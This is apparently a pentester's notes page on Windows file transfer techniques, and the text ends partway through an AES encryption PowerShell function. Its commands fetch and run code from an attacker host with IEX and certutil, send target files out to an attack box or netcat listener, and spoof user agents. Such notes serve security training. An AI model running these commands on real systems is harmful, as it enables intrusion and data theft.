<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/windows-exploitation/transfer-methods</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/windows-exploitation/transfer-methods"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>transfer methods</h1>

<p>send and receive things from / to windows systems.</p>

<h2>base64 encode and decode</h2>

<p>if the file size is small, we might not even need any connectivity to transfer your file. we can just encode it in base64, then copy it and decode it on our target.</p>

<p>keep in mind however that <code>cmd.exe</code> has a maximum string length of 8191 characters.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># on your attack box, get the MD5 hash of the file you want to "transfer"</span>
<span class="nb">md5sum</span> &lt;file&gt;

<span class="c"># then, encode it to base64</span>
<span class="nb">cat</span> &lt;file&gt; | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="p">;</span><span class="nb">echo</span>
</code></pre></div>

<p>then, paste the output into this powershell function to decode it:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="p">[</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"C:\Users\Public\&lt;filename&gt;"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">"&lt;base64 string&gt;"</span><span class="p">))</span><span class="w">
</span></code></pre></div>

<p>then, check if the MD5 hash remained the same:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">Get-FileHash</span><span class="w"> </span><span class="nx">C:\Users\Public\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Algorithm</span><span class="w"> </span><span class="nx">md5</span><span class="w">
</span></code></pre></div>

<p>we can go the other way around if necessary, encoding a file in base64 from our windows target:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s2">"C:\Windows\&lt;filename&gt;"</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w">

</span><span class="c"># always check the hash</span><span class="w">
</span><span class="n">Get-FileHash</span><span class="w"> </span><span class="nx">C:\Users\Public\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Algorithm</span><span class="w"> </span><span class="nx">md5</span><span class="w">
</span></code></pre></div>

<p>and then decode it on our linux attack box:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">echo</span> &lt;<span class="nb">base64 </span>string&gt; | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> &lt;filename&gt;

<span class="c"># and check that everything went well by comparing the previous hash</span>
<span class="nb">md5sum</span> &lt;filename&gt;
</code></pre></div>

<h2>certutil</h2>

<p>one of my favorite methods. widely available, works reliably.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># -verifyctl flag might be useful too</span><span class="w">
</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>powershell</h2>

<p>not all methods work depending on the target system, so select one appropriately. remember to try the <code>-UseBasicParsing</code> flag if you see an error related to internet explorer engine being unavailable.</p>

<p>if you encounter an error related to the SSL/TLS secure channel because of an untrusted certificate, try the <code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code> command.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># method 1</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;'</span><span class="p">,</span><span class="s1">'&lt;output_filename&gt;'</span><span class="p">)</span><span class="w">

</span><span class="c"># method 2</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFileAsync</span><span class="p">(</span><span class="s1">'http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;'</span><span class="p">,</span><span class="s1">'&lt;output_filename&gt;'</span><span class="p">)</span><span class="w">

</span><span class="c"># method 3 - fileless method</span><span class="w">
</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;'</span><span class="p">)</span><span class="w">
</span><span class="c"># or alternatively, with a pipe</span><span class="w">
</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">IEX</span><span class="w">

</span><span class="c"># method 4</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="p">(</span><span class="n">Start-BitsTransfer</span><span class="w"> </span><span class="nt">-Source</span><span class="w"> </span><span class="s2">"http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt; -Destination &lt;output_filename&gt;"</span><span class="p">)</span><span class="w">

</span><span class="c"># method 5 - requires powershell &gt;=3.0</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="s2">"http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;"</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="s2">"&lt;output_filename&gt;"</span><span class="w">
</span><span class="c"># or with wget alias</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nx">wget</span><span class="w"> </span><span class="s2">"http://&lt;IP&gt;:&lt;port&gt;/&lt;filename&gt;"</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="s2">"&lt;output_filename&gt;"</span><span class="w">
</span></code></pre></div>

<p>powershell doesn&#39;t have a readily available function to upload files, but we can download a remote script that makes use of <code>Invoke-RestMethod</code> or <code>Invoke-WebRequest</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># check the script before running it of course!</span><span class="w">
</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1'</span><span class="p">)</span><span class="w">

</span><span class="c"># we set up an uploadserver on our attack box with python3 -m uploadserver</span><span class="w">
</span><span class="n">Invoke-FileUpload</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/upload</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nx">C:\Windows\System32\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>we can also transfer a base64-encoded file through netcat on our attack box by using <code>Invoke-WebRequest</code> or <code>Invoke-RestMethod</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="nv">$b64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\Windows\System32\&lt;filename&gt;'</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">))</span><span class="w">

</span><span class="c"># set up a netcat listener on your attack box with nc -lvnp &lt;port&gt;</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$b64</span><span class="w">

</span><span class="c"># and then decode it, as shown earlier</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">base64</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>if HTTP, HTTPS and SMB are unavailable, we can also use powershell remoting, which is WinRM, to do file transfer operations. this creates listeners using TCP ports 5985 and 5986.</p>

<p>this however requires to have either admin access, be a member of the <code>remote management users</code>, or have explicit permissions for powershell remoting. if we have either of those, we can do the following:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># confirm port 5985 is listening on target</span><span class="w">
</span><span class="n">Test-NetConnection</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">5985</span><span class="w">

</span><span class="c"># create a powershell remoting session with the target</span><span class="w">
</span><span class="nv">$Session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># copy file from our machine to target machine</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-ToSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">path</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># copy file from target machine to our machine</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\&lt;filename&gt;"</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&lt;</span><span class="nx">path</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-FromSession</span><span class="w"> </span><span class="nv">$Session</span><span class="w">
</span></code></pre></div>

<p>you can also list and change your user agent before doing a file transfer with powershell:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># list available user agents</span><span class="w">
</span><span class="p">[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]</span><span class="o">.</span><span class="nf">GetProperties</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,@{</span><span class="nx">label</span><span class="o">=</span><span class="s2">"User Agent"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]::</span><span class="err">$</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">)}}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="c"># set user agent variable with names found from previous command</span><span class="w">
</span><span class="nv">$UserAgent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]::</span><span class="n">Chrome</span><span class="w">

</span><span class="c"># run invoke-webrequest with previous user agent</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-UserAgent</span><span class="w"> </span><span class="nv">$UserAgent</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"C:\Users\Public\&lt;filename&gt;"</span><span class="w">
</span></code></pre></div>

<h2>file encryption</h2>

<p>for sensitive file transfers, we can use the following <code>Invoke-AESEncryption.ps1</code> powershell module:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="o">.</span><span class="nf">EXAMPLE</span><span class="w">
</span><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Encrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p@ssw0rd"</span><span class="w"> </span><span class="nt">-Text</span><span class="w"> </span><span class="s2">"Secret Text"</span><span class="w"> 

</span><span class="n">Description</span><span class="w">
</span><span class="o">-----------</span><span class="w">
</span><span class="n">Encrypts</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="s2">"Secret Test"</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">outputs</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">Base64</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="nx">ciphertext.</span><span class="w">

</span><span class="o">.</span><span class="nf">EXAMPLE</span><span class="w">
</span><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Decrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p@ssw0rd"</span><span class="w"> </span><span class="nt">-Text</span><span class="w"> </span><span class="s2">"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="</span><span class="w">

</span><span class="n">Description</span><span class="w">
</span><span class="o">-----------</span><span class="w">
</span><span class="n">Decrypts</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Base64</span><span class="w"> </span><span class="nx">encoded</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="s2">"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">outputs</span><span class="w"> </span><span class="nx">plain</span><span class="w"> </span><span class="nx">text.</span><span class="w">

</span><span class="o">.</span><span class="nf">EXAMPLE</span><span class="w">
</span><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Encrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p@ssw0rd"</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">file.bin</span><span class="w">

</span><span class="n">Description</span><span class="w">
</span><span class="o">-----------</span><span class="w">
</span><span class="n">Encrypts</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="s2">"file.bin"</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">outputs</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="s2">"file.bin.aes"</span><span class="w">

</span><span class="o">.</span><span class="nf">EXAMPLE</span><span class="w">
</span><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Decrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"p@ssw0rd"</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">file.bin.aes</span><span class="w">

</span><span class="n">Description</span><span class="w">
</span><span class="o">-----------</span><span class="w">
</span><span class="n">Decrypts</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="s2">"file.bin.aes"</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">outputs</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="s2">"file.bin"</span><span class="w">
</span><span class="c">#&gt;</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">Invoke-AESEncryption</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span><span class="w">
    </span><span class="p">[</span><span class="n">OutputType</span><span class="p">([</span><span class="n">string</span><span class="p">])]</span><span class="w">
    </span><span class="kr">Param</span><span class="w">
    </span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">ValidateSet</span><span class="p">(</span><span class="s1">'Encrypt'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Decrypt'</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$Mode</span><span class="p">,</span><span class="w">

        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$Key</span><span class="p">,</span><span class="w">

        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="p">,</span><span class="w"> </span><span class="n">ParameterSetName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CryptText"</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$Text</span><span class="p">,</span><span class="w">

        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="p">,</span><span class="w"> </span><span class="n">ParameterSetName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CryptFile"</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$Path</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="kr">Begin</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$shaManaged</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Security.Cryptography.SHA256Managed</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Security.Cryptography.AesManaged</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Padding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">Zeros</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">BlockSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">KeySize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="kr">Process</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$shaManaged</span><span class="o">.</span><span class="nf">ComputeHash</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="nx">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$Key</span><span class="p">))</span><span class="w">

        </span><span class="kr">switch</span><span class="w"> </span><span class="p">(</span><span class="nv">$Mode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="s1">'Encrypt'</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$plainBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$Text</span><span class="p">)}</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="nv">$File</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
                    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                        </span><span class="n">Write-Error</span><span class="w"> </span><span class="nt">-Message</span><span class="w"> </span><span class="s2">"File not found!"</span><span class="w">
                        </span><span class="kr">break</span><span class="w">
                    </span><span class="p">}</span><span class="w">
                    </span><span class="nv">$plainBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="p">)</span><span class="w">
                    </span><span class="nv">$outPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">".aes"</span><span class="w">
                </span><span class="p">}</span><span class="w">

                </span><span class="nv">$encryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">CreateEncryptor</span><span class="p">()</span><span class="w">
                </span><span class="nv">$encryptedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$encryptor</span><span class="o">.</span><span class="nf">TransformFinalBlock</span><span class="p">(</span><span class="nv">$plainBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$plainBytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">)</span><span class="w">
                </span><span class="nv">$encryptedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$encryptedBytes</span><span class="w">
                </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$encryptedBytes</span><span class="p">)}</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$outPath</span><span class="p">,</span><span class="w"> </span><span class="nv">$encryptedBytes</span><span class="p">)</span><span class="w">
                    </span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$outPath</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$File</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w">
                    </span><span class="kr">return</span><span class="w"> </span><span class="s2">"File encrypted to </span><span class="nv">$outPath</span><span class="s2">"</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">

            </span><span class="s1">'Decrypt'</span><span class="w"> </span><span class="p">{</span><span class="w">
                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$cipherBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$Text</span><span class="p">)}</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="nv">$File</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
                    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                        </span><span class="n">Write-Error</span><span class="w"> </span><span class="nt">-Message</span><span class="w"> </span><span class="s2">"File not found!"</span><span class="w">
                        </span><span class="kr">break</span><span class="w">
                    </span><span class="p">}</span><span class="w">
                    </span><span class="nv">$cipherBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="p">)</span><span class="w">
                    </span><span class="nv">$outPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$File</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s2">".aes"</span><span class="w">
                </span><span class="p">}</span><span class="w">

                </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cipherBytes</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">15</span><span class="p">]</span><span class="w">
